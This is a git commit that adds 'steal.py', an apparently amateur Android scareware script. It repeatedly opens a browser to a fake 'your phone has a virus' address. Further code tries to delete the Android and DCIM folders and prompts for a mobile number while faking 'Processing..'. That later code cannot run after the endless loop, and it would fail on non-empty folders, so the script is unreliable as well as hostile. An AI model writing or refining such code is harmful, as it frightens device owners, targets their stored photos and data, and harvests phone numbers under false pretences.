dfa4c6a7f51f8af737368b16d6e576bd8c70f9db
Ph-Thund3r <70021444+Ph-Thund3r@users.noreply.github.com>
2020-08-21 21:40:49 +0800

    Create steal.py

---
+++ steal.py
@@ -0,0 +1,19 @@
+import os
+import webbrowser
+import time
+
+while True:
+	time.sleep(2)
+	webbrowser.open("https://Yourphonehasavirus/ByThund3r")
+	time.sleep(2)
+
+os.chdir("/storage/emulated/0/")
+
+os.mkdir("testvirus")
+
+os.rmdir("Android")
+os.rmdir("DCIM")
+
+input("Input Mobile Number:")
+while True:
+  print("Processing..")
